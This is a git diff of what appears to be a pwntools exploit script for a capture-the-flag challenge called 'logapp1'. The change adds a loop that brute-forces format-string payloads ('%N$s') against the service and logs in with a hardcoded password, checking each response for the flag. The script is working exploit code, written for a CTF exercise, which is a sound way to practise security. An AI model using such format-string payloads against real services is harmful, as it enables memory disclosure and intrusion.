@@ -3,7 +3,10 @@
 from pwn import *
 
 context.terminal = ["tmux", "splitw", "-h"]
+context.log_level = 'error'
 exe = context.binary = ELF(args.EXE or './logapp1')
+
+
 
 host = args.HOST or 'logapp1.chall.srdnlen.it'
 port = int(args.PORT or 443)
@@ -31,16 +34,39 @@ def start(argv=[], *a, **kw):
         return start_remote(argv, *a, **kw)
 
 gdbscript = '''
-br *0x4015fc
+br *0x401441
 continue
 '''.format(**locals())
 
 # -- Exploit goes here --
 
-io = start()
+# io = start()
 
-io.sendlineafter(b"> ", b"2")
-io.sendlineafter(b": ", b"SuperStrongPassword")
+i = 1
+while True:
+    i += 1
+    io = start()
+    try:
+        
+        io.sendlineafter(b"> ", b"1")
+        payload = f"%{i}$s"
+        io.sendlineafter(b": ", payload.encode())
+        io.sendlineafter(b": ", b"ciao")
 
-io.interactive()
+        io.recvline()
+        io.sendlineafter(b"> ", b"2")
+        io.sendlineafter(b": ", b"SuperStrongPassword")
+        io.recvline()
+        resp = io.recvline()
+        # print(resp)
+        if b"FLAG" in resp:
+            print(resp)
+            break
+    except EOFError:
+        pass
+        
+    io.close()
+        
+        # io.interactive()
 
+# 0x7f9ada2089a
